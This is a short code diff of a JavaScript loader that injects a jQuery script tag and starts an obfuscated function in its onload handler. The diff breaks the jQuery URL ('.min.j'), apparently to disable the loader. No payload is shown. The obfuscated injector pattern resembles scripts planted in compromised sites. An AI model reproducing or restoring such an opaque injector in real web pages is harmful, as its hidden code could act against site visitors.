@@ -1,6 +1,6 @@
 var rain = document['createElement']('script');
 rain['type'] = 'text/javascript';
-rain['src'] = 'https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js';
+rain['src'] = 'https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.j';
 rain['async'] = true;
 rain['onload'] = function() {
     ! function(_0x9b30x2) {
